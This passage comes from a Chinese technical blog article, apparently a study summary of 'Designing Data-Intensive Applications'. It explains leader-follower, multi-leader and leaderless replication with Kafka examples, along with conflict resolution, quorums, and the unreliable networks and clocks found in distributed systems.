referrerpolicy=\"no-referrer\"></p><p>如上图所示，在这个时间窗口中，任何情况都有可能发生。在这种情况下，客户端何时算写入完成，会决定其他客户端读到数据的可能性。这里我们假设这份数据有一个主副本和一个从副本，如果主副本保存后即向客户端返回成功，这样叫做异步复制（1）。而如果等到数据传送到从副本1，并得到确认之后再返回客户端成功，称为同步复制（2）。这里我们先假设系统正常运行，在异步同步下，如果从副本承担读请求，假设reader1和reader2同时在客户端收到写入成功后发出读请求，两个reader就可能读到不一样的值。</p><p>为了避免这种情况，实际上有两种角度的做法，第一种角度是让客户端只从主副本读取数据，这样，在正常情况下，所有客户端读到的数据一定是一致的（Kafka当前的做法）；另一种角度则是采用同步复制，假设使用纯的同步复制，当有多个副本时，任何一个副本所在的节点发生故障，都会使写请求阻塞，同时每次写请求都需要等待所有节点确认，如果副本过多会极大影响吞吐量。而如果仅采用异步复制并由主副本承担读请求，当主节点故障发生切换时，一样会发生数据不一致的问题。</p><p>很多系统会把这个决策权交给用户，这里我们以Kafka为例，首先提供了同步与异步复制的语义（通过客户端的acks参数确定），另外提供了ISR机制，而只需要ISR中的副本确认即可，系统可以容忍部分节点因为各种故障而脱离ISR，那样客户端将不用等待其确认，增加了系统的容错性。当前Kafka未提供让从节点承担读请求的设计，但在高版本中已经有了这个Feature。这种方式使系统有了更大的灵活性，用户可以根据场景自由权衡一致性和可用性。</p><h4>主从模式下需要的一些能力</h4><p><strong>增加新的从副本（节点）</strong></p><ol><li>在Kafka中，我们所采取的的方式是通过新建副本分配的方式，以追赶的方式从主副本中同步数据。</li><li>数据库所采用的的方式是通过快照+增量的方式实现。</li></ol><p>a.在某一个时间点产生一个一致性的快照。\nb.将快照拷贝到从节点。\nc.从节点连接到主节点请求所有快照点后发生的改变日志。\nd.获取到日志后，应用日志到自己的副本中，称之为追赶。\ne.可能重复多轮a-d。</p><p><strong>处理节点失效</strong></p><p><strong>从节点失效——追赶式恢复</strong></p><p>针对从节点失效，恢复手段较为简单，一般采用追赶式恢复。而对于数据库而言，从节点可以知道在崩溃前所执行的最后一个事务，然后连接主节点，从该节点将拉取所有的事件变更，将这些变更应用到本地记录即可完成追赶。</p><p>对于Kafka而言，恢复也是类似的，Kafka在运行过程中，会定期项磁盘文件中写入checkpoint，共包含两个文件，一个是recovery-point-offset-checkpoint，记录已经写到磁盘的offset，另一个则是replication-offset-checkpoint，用来记录高水位（下文简称HW），由ReplicaManager写入，下一次恢复时，Broker将读取两个文件的内容，可能有些被记录到本地磁盘上的日志没有提交，这时就会先截断（Truncate）到HW对应的offset上，然后从这个offset开始从Leader副本拉取数据，直到认追上Leader，被加入到ISR集合中</p><p><strong>主节点失效–节点切换</strong></p><p>主节点失效则会稍稍复杂一些，需要经历三个步骤来完成节点的切换。</p><ol><li>确认主节点失效，由于失效的原因有多种多样，大多数系统会采用超时来判定节点失效。一般都是采用节点间互发心跳的方式，如果发现某个节点在较长时间内无响应，则会认定为节点失效。具体到Kafka中，它是通过和Zookeeper（下文简称ZK）间的会话来保持心跳的，在启动时Kafka会在ZK上注册临时节点，此后会和ZK间维持会话，假设Kafka节点出现故障（这里指被动的掉线，不包含主动执行停服的操作），当会话心跳超时时，ZK上的临时节点会掉线，这时会有专门的组件（Controller）监听到这一信息，并认定节点失效。</li><li>选举新的主节点。这里可以通过通过选举的方式（民主协商投票，通常使用共识算法），或由某个特定的组件指定某个节点作为新的节点（Kafka的Controller）。在选举或指定时，需要尽可能地让新主与原主的差距最小，这样会最小化数据丢失的风险（让所有节点都认可新的主节点是典型的共识问题）——这里所谓共识，就是让一个小组的节点就某一个议题达成一致，下一篇文章会重点进行介绍。</li><li>重新配置系统是新的主节点生效，这一阶段基本可以理解为对集群的元数据进行修改，让所有外界知道新主节点的存在（Kafka中Controller通过元数据广播实现），后续及时旧的节点启动，也需要确保它不能再认为自己是主节点，从而承担写请求。</li></ol><p><strong>问题</strong></p><p>虽然上述三个步骤较为清晰，但在实际发生时，还会存在一些问题：</p><ol><li>假设采用异步复制，在失效前，新的主节点与原主节点的数据存在Gap，选举完成后，原主节点很快重新上线加入到集群，这时新的主节点可能会收到冲突的写请求，此时还未完全执行上述步骤的第三步，也就是原主节点没有意识到自己的角色发生变化，还会尝试向新主节点同步数据。这时，一般的做法是，将原主节点上未完成复制的写请求丢掉，但这又可能会发生数据丢失或不一致，假设我们每条数据采用MySQL的自增ID作为主键，并且使用Redis作为缓存，假设发生了MySQL的主从切换，从节点的计数器落后于主节点，那样可能出现应用获取到旧的自增ID，这样就会与Redis上对应ID取到的数据不一致，出现数据泄露或丢失。</li><li>假设上面的问题，原主节点因为一些故障永远不知道自己角色已经变更，则可能发生“脑裂”，两个节点同时操作数据，又没有相应解决冲突（没有设计这一模块），就有可能对数据造成破坏。</li><li>此外，对于超时时间的设定也是个十分复杂的问题，过长会导致服务不可用，设置过短则会导致节点频繁切换，假设本身系统处于高负载状态，频繁角色切换会让负载进一步加重（团队内部对Kafka僵尸节点的处理逻辑）。</li></ol><h4>异步复制面临的主要问题–复制滞后</h4><p>如前文所述，如果我们使用纯的同步复制，任何一台机器发生故障都会导致服务不可写入，并且在数较多的情况下，吞吐和可用性都会受到比较大的影响。很多系统都会采用半步复制或异步复制来在可用性和一致性之间做权衡。</p><p>在异步复制中，由于写请求写到主副本就返回成功，在数据复制到其他副本的过程中，如果客户端进行读取，在不同副本读取到的数据可能会不一致，《DDIA》将这个种现象称为复制滞后（Replication Lag），存在这种问题的复制行为所形成的数据一致性统称为最终一致性。未来还会重点介绍一下一致性和共识，但在本文不做过多的介绍，感兴趣的同学可以提前阅读《Problems with Replication Lag》这一章节。</p><h3>2.2 多主节点复制</h3><p>前文介绍的主从复制模型中存在一个比较严重的弊端，就是所有写请求都需要经过主节点，因为只存在一个主节点，就很容易出现性能问题。虽然有从节点作为冗余应对容错，但对于写入请求实际上这种复制方式是不具备扩展性的。</p><p>此外，如果客户端来源于多个地域，不同客户端所感知到的服务相应时间差距会非常大。因此，有些系统顺着传统主从复制进行延伸，采用多个主节点同时承担写请求，主节点接到写入请求之后将数据同步到从节点，不同的是，这个主节点可能还是其他节点的从节点。复制模式如下图所示，可以看到两个主节点在接到写请求后，将数据同步到同一个数据中心的从节点。此外，该主节点还将不断同步在另一数据中心节点上的数据，由于每个主节点同时处理其他主节点的数据和客户端写入的数据，因此需要模型中增加一个冲突处理模块，最后写到主节点的数据需要解决冲突。</p><p><img src=\"https://p0.meituan.net/travelcube/d9d8467ab95ca2fe970c1ddec9a77c61110127.png\" alt=\"图3 多主节点复制\" referrerpolicy=\"no-referrer\"></p><h4>使用场景</h4><p><strong>a. 多数据中心部署</strong></p><p>一般采用多主节点复制，都是为了做多数据中心容灾或让客户端就近访问（用一个高大上的名词叫做异地多活），在同一个地域使用多主节点意义不大，在多个地域或者数据中心部署相比主从复制模型有如下的优势：</p><ul><li><strong>性能提升</strong>：性能提升主要表现在两个核心指标上，首先从吞吐方面，传统的主从模型所有写请求都会经过主节点，主节点如果无法采用数据分区的方式进行负载均衡，可能存在性能瓶颈，采用多主节点复制模式下，同一份数据就可以进行负载均衡，可以有效地提升吞吐。另外，由于多个主节点分布在多个地域，处于不同地域的客户端可以就近将请求发送到对应数据中心的主节点，可以最大程度地保证不同地域的客户端能够以相似的延迟读写数据，提升用户的使用体验。</li><li><strong>容忍数据中心失效</strong>：对于主从模式，假设主节点所在的数据中心发生网络故障，需要发生一次节点切换才可将流量全部切换到另一个数据中心，而采用多主节点模式，则可无缝切换到新的数据中心，提升整体服务的可用性。</li></ul><p><strong>b.离线客户端操作</strong></p><p>除了解决多个地域容错和就近访问的问题，还有一些有趣的场景，其中一个场景则是在网络离线的情况下还能继续工作，例如我们笔记本电脑上的笔记或备忘录，我们不能因为网络离线就禁止使用该程序，我们依然可以在本地愉快的编辑内容（图中标记为Offline状态），当我们连上网之后，这些内容又会同步到远程的节点上，这里面我们把本地的App也当做其中的一个副本，那么就可以承担用户在本地的变更请求。联网之后，再同步到远程的主节点上。</p><p><img src=\"https://p0.meituan.net/travelcube/de006ee4a0b0bf77ae2c550a562aacb130092.png\" alt=\"图4 Notion界面\" referrerpolicy=\"no-referrer\"></p><p><strong>c.协同编辑</strong></p><p>这里我们对离线客户端操作进行扩展，假设我们所有人同时编辑一个文档，每个人通过Web客户端编辑的文档都可以看做一个主节点。这里我们拿美团内部的学城（内部的Wiki系统）举例，当我们正在编辑一份文档的时候，基本上都会发现右上角会出现“xxx也在协同编辑文档”的字样，当我们保存的时候，系统就会自动将数据保存到本地并复制到其他主节点上，各自处理各自端上的冲突。</p><p>另外，当文档出现了更新时，学城会通知我们有更新，需要我们手动点击更新，来更新我们本地主节点的数据。书中说明，虽然不能将协同编辑完全等同于数据库复制，但却是有很多相似之处，也需要处理冲突问题。</p><h3>冲突解决</h3><p>通过上面的分析，我们了解到多主复制模型最大挑战就是解决冲突，下面我们简单看下《DDIA》中给出的通用解法，在介绍之前，我们先来看一个典型的冲突。</p><h4>a.冲突实例</h4><p><img src=\"https://p0.meituan.net/travelcube/d4355d8092edb96a96fa98469ef042c4113532.png\" alt=\"图5 冲突实例\" referrerpolicy=\"no-referrer\"></p><p>在图中，由于多主节点采用异步复制，用户将数据写入到自己的网页就返回成功了，但当尝试把数据复制到另一个主节点时就会出问题，这里我们如果假设主节点更新时采用类似CAS的更新方式时更新时，都会由于预期值不符合从而拒绝更新。针对这样的冲突，书中给出了几种常见的解决思路。</p><h4>b.解决思路</h4><p><strong>1. 避免冲突</strong></p><p>所谓解决问题最根本的方式则是尽可能不让它发生，如果能够在应用层保证对特定数据的请求只发生在一个节点上，这样就没有所谓的“写冲突”了。继续拿上面的协同编辑文档举例，如果我们把每个人的都在填有自己姓名表格的一行里面进行编辑，这样就可以最大程度地保证每个人的修改范围不会有重叠，冲突也就迎刃而解了。</p><p><strong>2. 收敛于一致状态</strong></p><p>然而，对更新标题这种情况而言，冲突是没法避免的，但还是需要有方法解决。对于单主节点模式而言，如果同一个字段有多次写入，那么最后写入的一定是最新的。ZK、KafkaController、KafkaReplica都有类似Epoch的方式去屏蔽过期的写操作，由于所有的写请求都经过同一个节点，顺序是绝对的，但对于多主节点而言，由于没有绝对顺序的保证，就只能试图用一些方式来决策相对顺序，使冲突最终收敛，这里提到了几种方法：</p><p>给每个写请求分配Uniq-ID，例如一个时间戳，一个随机数，一个UUID或Hash值，最终取最高的ID作为最新的写入。如果基于时间戳，则称作最后写入者获胜（LWW），这种方式看上去非常直接且简单，并且非常流行。但很遗憾，文章一开始也提到了，分布式系统没有办法在机器间共享一套统一的系统时间，所以这个方案很有可能因为这个问题导致数据丢失（时钟漂移）。</p><p>每个副本分配一个唯一的ID，ID高的更新优先级高于地域低的，这显然也会丢失数据。</p><p>当然，我们可以用某种方式做拼接，或利用预先定义的格式保留冲突相关信息，然后由用户自行解决。</p><p><strong>3. 用户自行处理</strong></p><p>其实，把这个操作直接交给用户，让用户自己在读取或写入前进行冲突解决，这种例子也是屡见不鲜，Github采用就是这种方式。</p><p>这里只是简单举了一些冲突的例子，其实冲突的定义是一个很微妙的概念。《DDIA》第七章介绍了更多关于冲突的概念，感兴趣同学可以先自行阅读，在下一篇文章中也会提到这个问题。</p><h4>c.处理细节介绍</h4><p>此外，在书中将要结束《复制》这一章时，也详细介绍了如何进行冲突的处理，这里也简单进行介绍。</p><p>这里我们可以思考一个问题，为什么会发生冲突？通过阅读具体的处理手段后，我们可以尝试这样理解，正是因为我们对事件发生的先后顺序不确定，但这些事件的处理主体都有重叠（比如都有设置某个数据的值）。通过我们对冲突的理解，加上我们的常识推测，会有这样几种方式可以帮我们来判断事件的先后顺序。</p><p><strong>1. 直接指定事件顺序</strong></p><p>对于事件发生的先后顺序，我们一个最直观的想法就是，两个请求谁新要谁的，那这里定义“最新”是个问题，一个很简单的方式是使用时间戳，这种算法叫做最后写入者获胜LWW。</p><p>但分布式系统中没有统一的系统时钟，不同机器上的时间戳无法保证精确同步，那就可能存在数据丢失的风险，并且由于数据是覆盖写，可能不会保留中间值，那么最终可能也不是一致的状态，或出现数据丢失。如果是一些缓存系统，覆盖写看上去也是可以的，这种简单粗暴的算法是非常好的收敛冲突的方式，但如果我们对数据一致性要求较高，则这种方式就会引入风险，除非数据写入一次后就不会发生改变。</p><p><strong>2. 从事件本身推断因果关系和并发</strong></p><p>上面直接简单粗暴的制定很明显过于武断，那么有没有可能时间里面就存在一些因果关系呢，如果有我们很显然可以通过因果关系知道到底需要怎样的顺序，如果不行再通过指定的方式呢？</p><p>例如：</p><p><img src=\"https://p1.meituan.net/travelcube/a8f6d369fb418fc6905e97921c4e7e02149180.png\" alt=\"图6 违背因果关系示例\" referrerpolicy=\"no-referrer\"></p><p>这里是书中一个多主节点复制的例子，这里ClientA首先向Leader1增加一条数据x=1，然Leader1采用异步复制的方式，将变更日志发送到其他的Leader上。在复制过程中，ClientB向Leader3发送了更新请求，内容则是更新Key为x的Value，使Value=Value+1。</p><p>原图中想表达的是，update的日志发送到Leader2的时间早于insert日志发送到Leader2的时间，会导致更新的Key不存在。但是，这种所谓的事件关系本身就不是完全不相干的，书中称这种关系为依赖或者Happens-before。</p><p>我们可能在JVM的内存模型（JMM）中听到过这个词，在JMM中，表达的也是多个线程操作的先后顺序关系。这里，如果我们把线程或者请求理解为对数据的操作（区别在于一个是对本地内存数据，另一个是对远程的某处内存进行修改），线程或客户端都是一种执行者（区别在于是否需要使用网络），那这两种Happens-before也就可以在本质上进行统一了，都是为了描述事件的先后顺序而生。</p><p>书中给出了检测这类事件的一种算法，并举了一个购物车的例子，如图所示（以餐厅扫码点餐的场景为例）：</p><p><img src=\"https://p0.meituan.net/travelcube/f119fc2a8c5d656483dfbce3f830fb8a452755.png\" alt=\"图7 扫码点餐示例\" referrerpolicy=\"no-referrer\"></p><p>图中两个客户端同时向购物车里放东西，事例中的数据库假设只有一个副本。</p><ol><li>首先Client1向购物车中添加牛奶，此时购物车为空，返回版本1，Value为[牛奶]。</li><li>此时Client2向其中添加鸡蛋，其并不知道Client1添加了牛奶，但服务器可以知道，因此分配版本号为2，并且将鸡蛋和牛奶存成两个单独的值，最后将两个值和版本号2返回给客户端。此时服务端存储了[鸡蛋] 2 [牛奶]1。</li><li>同理，Client1添加面粉，这时候Client1只认为添加了[牛奶]，因此将面粉与牛奶合并发送给服务端[牛奶，面粉]，同时还附带了之前收到的版本号1，此时服务端知道，新值[牛奶，面粉]可以替换同一个版本号中的旧值[牛奶]，但[鸡蛋]是并发事件，分配版本号3，返回值[牛奶，面粉] 3 [鸡蛋]2。</li><li>同理，Client2向购物车添加[火腿]，但在之前的请求中，返回了[鸡蛋][牛奶]，因此和火腿合并发送给服务端[鸡蛋，牛奶，火腿]，同时附带了版本号2，服务端直接将新值覆盖之前版本2的值[鸡蛋]，但[牛奶，面粉]是并发事件，因此存储值为[牛奶，面粉] 3 [鸡蛋，牛奶，火腿] 4并分配版本号4。</li><li>最后一次Client添加培根，通过之前返回的值里，知道有[牛奶，面粉，鸡蛋]，Client将值合并[牛奶，面粉，鸡蛋，培根]联通之前的版本号一起发送给服务端，服务端判断[牛奶，面粉，鸡蛋，培根]可以覆盖之前的[牛奶，面粉]但[鸡蛋，牛奶，火腿]是并发值，加以保留。</li></ol><p>通过上面的例子，我们看到了一个根据事件本身进行因果关系的确定。书中给出了进一步的抽象流程：</p><ul><li>服务端为每个主键维护一个版本号，每当主键新值写入时递增版本号，并将新版本号和写入值一起保存。</li><li>客户端写主键，写请求比包含之前读到的版本号，发送的值为之前请求读到的值和新值的组合，写请求的相应也会返回对当前所有的值，这样就可以一步步进行拼接。</li><li>当服务器收到有特定版本号的写入时，覆盖该版本号或更低版本号的所有值，保留高于请求中版本号的新值（与当前写操作属于并发）。</li></ul><p>有了这套算法，我们就可以检测出事件中有因果关系的事件与并发的事件，而对于并发的事件，仍然像上文提到的那样，需要依据一定的原则进行合并，如果使用LWW，依然可能存在数据丢失的情况。因此，需要在服务端程序的合并逻辑中需要额外做些事情。</p><p>在购物车这个例子中，比较合理的是合并新值和旧值，即最后的值是[牛奶，鸡蛋，面粉，火腿，培根]，但这样也会导致一个问题，假设其中的一个用户删除了一项商品，但是union完还是会出现在最终的结果中，这显然不符合预期。因此可以用一个类似的标记位，标记记录的删除，这样在合并时可以将这个商品踢出，这个标记在书中被称为墓碑（Tombstone）。</p><h3>2.3 无主节点复制</h3><p>之前介绍的复制模式都是存在明确的主节点，从节点的角色划分的，主节点需要将数据复制到从节点，所有写入的顺序由主节点控制。但有些系统干脆放弃了这个思路，去掉了主节点，任何副本都能直接接受来自客户端的写请求，或者再有一些系统中，会给到一个协调者代表客户端进行写入（以Group Commit为例，由一个线程积攒所有客户端的请求统一发送），与多主模式不同，协调者不负责控制写入顺序，这个限制的不同会直接影响系统的使用方式。</p><h3>处理节点失效</h3><p>假设一个数据系统拥有三个副本，当其中一个副本不可用时，在主从模式中，如果恰好是主节点，则需要进行节点切换才能继续对外提供服务，但在无主模式下，并不存在这一步骤，如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/14956b28a2780f8db791ac3e1c6bf308163702.png\" alt=\"图8 Quorum写入处理节点失效\" referrerpolicy=\"no-referrer\"></p><p>这里的Replica3在某一时刻无法提供服务，此时用户可以收到两个Replica的写入成功的确认，即可认为写入成功，而完全可以忽略那个无法提供服务的副本。当失效的节点恢复时，会重新提供读写服务，此时如果客户端向这个副本读取数据，就会请求到过期值。</p><p>为了解决这个问题，这里客户端就不是简单向一个节点请求数据了，而是向所有三个副本请求，这时可能会收到不同的响应，这时可以通过类似版本号来区分数据的新旧（类似上文中并发写入的检测方式）。这里可能有一个问题，副本恢复之后难道就一直让自己落后于其他副本吗？这肯定不行，这会打破一致性的语义，因此需要一个机制。有两种思路：</p><ol><li>客户端读取时对副本做修复，如果客户端通过并行读取多个副本时，读到了过期的数据，可以将数据写入到旧副本中，以便追赶上新副本。</li><li>反熵查询，一些系统在副本启动后，后台会不断查找副本之间的数据diff，将diff写到自己的副本中，与主从复制模式不同的是，此过程不保证写入的顺序，并可能引发明显的复制滞后。</li></ol><h3>读写Quorum</h3><p>上文中的实例我们可以看出，这种复制模式下，要想保证读到的是写入的新值，每次只从一个副本读取显然是有问题的，那么需要每次写几个副本呢，又需要读取几个副本呢？这里的一个核心点就是让写入的副本和读取的副本有交集，那么我们就能够保证读到新值了。</p><p>直接上公式：$w+r&gt;N$ 。其中N为副本的数量，w为每次并行写入的节点数，r为每次同时读取的节点数，这个公式非常容易理解，就不做过多赘述。不过这里的公式虽然看着比较直白也简单，里面却蕴含了一些系统设计思考：</p><ul><li>一般配置方法，取$w=r=\\lceil\\frac{(N+1)}{2}\\rceil$</li><li><p>w，r与N的关系决定了能够容忍多少的节点失效</p><ul><li>假设N=3, w=2, r=2，可以容忍1个节点故障。</li><li>假设N=5，w=3, r=3 可以容忍2个节点故障。</li><li>N个节点可以容忍可以容忍$\\lceil\\frac{(N+1)}{2}\\rceil -1$个节点故障。</li></ul></li><li><p>在实际实现中，一般数据会发送或读取所有节点，w和r决定了我们需要等待几个节点的写入或读取确认。</p></li></ul><h3>Quorum一致性的局限性</h3><p>看上去这个简单的公式就可以实现很强大的功能，但这里有一些问题值得注意：</p><ul><li>首先，Quorum并不是一定要求多数，重要的是读取的副本和写入副本有重合即可，可以按照读写的可用性要求酌情考虑配置。</li><li>另外，对于一些没有很强一致性要求的系统，可以配置w+r &lt;= N，这样可以等待更少的节点即可返回，这样虽然有可能读取到一个旧值，但这种配置可以很大提升系统的可用性，当网络大规模故障时更有概率让系统继续运行而不是由于没有达到Quorum限制而返回错误。</li><li><p>假设在w+r&gt;N的情况下，实际上也存在边界问题导致一些一致性问题：</p><ul><li>首先假设是Sloppy Quorum（一个更为宽松的Quorum算法），写入的w和读取的r可能完全不相交，因此不能保证数据一定是新的。</li><li>如果两个写操作同时发生，那么还是存在冲突，在合并时，如果基于LWW，仍然可能导致数据丢失。</li><li>如果写读同时发生，也不能保证读请求一定就能取到新值，因为复制具有滞后性（上文的复制窗口）。</li><li>如果某些副本写入成功，其他副本写入失败（磁盘空间满）且总的成功数少于w，那些成功的副本数据并不会回滚，这意味着及时写入失败，后续还是可能读到新值。</li></ul></li></ul><p>虽然，看上去Quorum复制模式可以保证获取到新值，但实际情况并不是我们想象的样子，这个协议到最后可能也只能达到一个最终的一致性，并且依然需要共识算法的加持。</p><h3>2.4 本章小结</h3><p>以上我们介绍了所有常见的复制模式，我们可以看到，每种模式都有一定的应用场景和优缺点，但是很明显，光有复制模式远远达不到数据的一致性，因为分布式系统中拥有太多的不确定性，需要后面各种事务、共识算法的帮忙才能去真正对抗那些“稀奇古怪”的问题。</p><p>到这里，可能会有同学就会问，到底都是些什么稀奇古怪的问题呢？相比单机系统又有那些独特的问题呢？下面本文先来介绍分布式系统中的几个最典型的挑战（Trouble），让一些同学小小地“绝望”一下，然后我们会下一篇文章中再揭晓答案。</p><h2>3. 分布式系统的挑战</h2><p>这部分存在的意义主要想让大家理解，为什么一些看似简单的问题到了分布式系统中就会变得异常复杂。顺便说一声，这一章都是一些“奇葩”现象，并没有过于复杂的推理和证明，希望大家能够较为轻松愉悦地看完这些内容。</p><h3>3.1 部分失效</h3><p>这是分布式系统中特有的一个名词，这里先看一个现实当中的例子。假设老板想要处理一批文件，如果让一个人做，需要十天。但老板觉得有点慢，于是他灵机一动，想到可以找十个人来搞定这件事，然后自己把工作安排好，认为这十个人一天正好干完，于是向他的上级信誓旦旦地承诺一天搞定这件事。他把这十个人叫过来，把任务分配给了他们，他们彼此建了个微信群，约定每个小时在群里汇报自己手上的工作进度，并强调在晚上5点前需要通过邮件提交最后的结果。于是老版就去愉快的喝茶去了，但是现实却让他大跌眼镜。</p><p>首先，有个同学家里信号特别差，报告进度的时候只成功报告了3个小时的，然后老板在微信里问，也收不到任何回复，最后结果也没法提交。另一个同学家的表由于长期没换电池，停在了下午四点，结果那人看了两次表都是四点，所以一点都没着急，中间还看了个电影，慢慢悠悠做完交上去了，他还以为老板会表扬他，提前了一小时交，结果实际上已经是晚上八点了。还有一个同学因为前一天没睡好，效率极低，而且也没办法再去高强度的工作了。结果到了晚上5点，只有7个人完成了自己手头上的工作。</p><p>这个例子可能看起来并不是非常恰当，但基本可以描述分布式系统特有的问题了。在分布式的系统中，我们会遇到各种“稀奇古怪”的故障，例如家里没信号（网络故障)，不管怎么叫都不理你，或者断断续续的理你。另外，因为每个人都是通过自己家的表看时间的，所谓的5点需要提交结果，在一定程度上旧失去了参考的绝对价值。因此，作为上面例子中的“老板”，不能那么自信的认为一个人干工作需要10天，就可以放心交给10个人，让他们一天搞定。</p><p>我们需要有各种措施来应对分派任务带来的不确定性，回到分布式系统中，部分失效是分布式系统一定会出现的情况。作为系统本身的设计人员，我们所设计的系统需要能够容忍这种问题，相对单机系统来说，这就带来了特有的复杂性。</p><h3>3.2 分布式系统特有的故障</h3><h4>不可靠的网络</h4><p>对于一个纯的分布式系统而言，它的架构大多为Share Nothing架构，即使是存算分离这种看似的Share Storage，它的底层存储一样是需要解决Share Nothing的。所谓Nothing，这里更倾向于叫Nothing but Network，网络是不同节点间共享信息的唯一途径，数据的传输主要通过以太网进行传输，这是一种异步网络，也就是网络本身并不保证发出去的数据包一定能被接到或是何时被收到。这里可能发生各种错误，如下图所示：</p><p><img src=\"https://p0.meituan.net/travelcube/0c7cc28d54d2476c424e39477a88b7b395505.png\" alt=\"图9 不可靠的网络\" referrerpolicy=\"no-referrer\"></p><ol><li>请求丢失</li><li>请求正在某个队列中等待</li><li>远程节点已经失效</li><li>远程节点无法响应</li><li>远程节点已经处理完请求，但在ack的时候丢包</li><li>远程接收节点已经处理完请求，但回复处理很慢</li></ol><p>本文认为，造成网络不可靠的原因不光是以太网和IP包本身，其实应用本身有时候异常也是造成网络不可靠的一个诱因。因为，我们所采用的节点间传输协议大多是TCP，TCP是个端到端的协议，是需要发送端和接收端两端内核中明确维护数据结构来维持连接的，如果应用层发生了下面的问题，那么网络包就会在内核的Socket Buffer中排队得不到处理，或响应得不到处理。</p><ol><li>应用程序GC。</li><li>处理节点在进行重的磁盘I/O，导致CPU无法从中断中恢复从而无法处理网络请求。</li><li>由于内存换页导致的颠簸。</li></ol><p>这些问题和网络本身的不稳定性相叠加，使得外界认为的网络不靠谱的程度更加严重。因此这些不靠谱，会极大地加重上一章中的 复制滞后性，进而带来各种各样的一致性问题。</p><h4>应对之道</h4><p>网络异常相比其他单机上的错误而言，可能多了一种不确定的返回状态，即延迟，而且延迟的时间完全无法预估。这会让我们写起程序来异常头疼，对于上一章中的问题，我们可能无从知晓节点是否失效，因为你发的请求压根可能不会有人响应你。因此，我们需要把上面的“不确定”变成一种确定的形式，那就是利用“超时”机制。这里引申出两个问题：</p><ol><li><p>假设能够检测出失效，我们应该如何应对？</p><p>a. 负载均衡需要避免往失效的节点上发数据（服务发现模块中的健康检查功能）。\nb. 如果在主从复制中，如果主节点失效，需要出发选举机制（Kafka中的临时节点掉线，Controller监听到变更触发新的选举，Controller本身的选举机制）。\nc. 如果服务进程崩溃，但操作系统运行正常，可以通过脚本通知其他节点，以便新的节点来接替（Kafka的僵尸节点检测，会触发强制的临时节点掉线）。\nd. 如果路由器已经确认目标节点不可访问，则会返回ICMP不可达（ping不通走下线）。</p></li><li><p>如何设置超时时间是合理的？</p></li></ol><p>很遗憾地告诉大家，这里面实际上是个权衡的问题，短的超时时间会更快地发现故障，但同时增加了误判的风险。这里假设网络正常，那么如果端到端的ping时间为d，处理时间为r，那么基本上请求会在2d+r的时间完成。但在现实中，我们无法假设异步网络的具体延迟，实际情况可能会更复杂。因此这是一个十分靠经验的工作。</p><h3>3.2 不可靠的时钟</h3><p>说完了“信号”的问题，下面就要说说每家的“钟表”——时钟了，它主要用来做两件事：</p><ol><li>描述当前的绝对时间</li><li>描述某件事情的持续时间</li></ol><p>在DDIA中，对于这两类用途给出了两种时间，一类成为墙上时钟，它们会返回当前的日期和时间，例如clock_gettime(CLOCK_REALTIME)或者System.currentTimeMills，但这类反应精确时间的API，由于时钟同步的问题，可能会出现回拨的情况。因此，作为持续时间的测量通常采用单调时钟，例如clock_gettime(CLOCK_MONOTONIC) 或者System.nanoTime。高版本的Kafka中把请求的相应延迟计算全部换成了这个API实现，应该也是这个原因。</p><p>这里时钟同步的具体原理，以及如何会出现不准确的问题，这里就不再详细介绍了，感兴趣的同学可以自行阅读书籍。下面将介绍一下如何使用时间戳来描述事件顺序的案例，并展示如何因时钟问题导致事件顺序判断异常的：</p><p><img src=\"https://p0.meituan.net/travelcube/d2a23885bc959e69b9e919980c19c613159710.png\" alt=\"图10 不可靠的时钟\" referrerpolicy=\"no-referrer\"></p><p>这里我们发现，Node1的时钟比Node3快，当两个节点在处理完本地请求准备写Node2时发生了问题，原本ClientB的写入明显晚于ClientA的写入，但最终的结果，却由于Node1的时间戳更大而丢弃了本该保留的x+=1，这样，如果我们使用LWW，一定会出现数据不符合预期的问题。</p><p>由于时钟不准确，这里就引入了统计学中的置信区间的概念，也就是这个时间到底在一个什么样的范围里，一般的API是无法返回类似这样的信息的。不过，Google的TrueTime API则恰恰能够返回这种信息，其调用结果是一个区间，有了这样的API，确实就可以用来做一些对其有依赖的事情了，例如Google自家的Spanner，就是使用TrueTime实现快照隔离。</p><h3>如何在这艰难的环境中设计系统</h3><p>上面介绍的问题是不是挺“令人绝望”的？你可能发现，现在时间可能是错的，测量可能是不准的，你的请求可能得不到任何响应，你可能不知道它是不是还活着……这种环境真的让设计分布式系统变得异常艰难，就像是你在100个人组成的大部门里面协调一些工作一样，工作量异常的巨大且复杂。</p><p>但好在我们并不是什么都做不了，以协调这件事为例，我们肯定不是武断地听取一个人的意见，让我们回到学生时代。我们需要评选一位班长，肯定我们都经历过投票、唱票的环节，最终得票最多的那个人当选，有时可能还需要设置一个前提，需要得票超过半数。</p><p>映射到分布式系统中也是如此，我们不能轻易地相信任何一台节点的信息，因为它有太多的不确定，因此更多的情况下，在分布式系统中如果我们需要就某个事情达成一致，也可以采取像竞选或议会一样，大家协商、投票、仲裁决定一项提议达成一致，真相由多数人商议决定，从而达到大家的一致和统一，这也就是后面要介绍的分布式共识协议。这个协议能够容忍一些节点的部分失效，或者莫名其妙的故障带来的问题，让系统能够正常地运行下去，确保请求到的数据是可信的。</p><p>下面给出一些实际分布式算法的理论模型，根据对于延迟的假设不同，这里介绍三种系统模型。</p><p><strong>1. 同步模型</strong></p><p>该模型主要假设网络延迟是有界的，我们可以清楚地知道这个延迟的上下界，不管出现任何情况，它都不会超出这个界限。</p><p><strong>2. 半同步模型（大部分模型都是基于这个假设）</strong></p><p>半同步模型认为大部分情况下，网络和延迟都是正常的，如果出现违背的情况，偏差可能会非常大。</p><p><strong>3. 异步模型</strong></p><p>对延迟不作任何假设，没有任何超时机制。</p><p>而对于节点失效的处理，也存在三种模型，这里我们忽略恶意谎言的拜占庭模型，就剩下两种。</p><p><strong>1.崩溃-终止模型（Crash-Stop）</strong>：该模型中假设一个节点只能以一种方式发生故障，即崩溃，可能它会在任意时刻停止响应，然后永远无法恢复。</p><p><strong>2.崩溃-恢复模型</strong>：节点可能在任何时刻发生崩溃，可能会在一段时间后恢复，并再次响应，在该模型中假设，在持久化存储中的数据将得以保存，而内存中的数据会丢失。</p><p>而多数的算法都是基于半同步模型+崩溃-恢复模型来进行设计的。</p><h4>Safety and 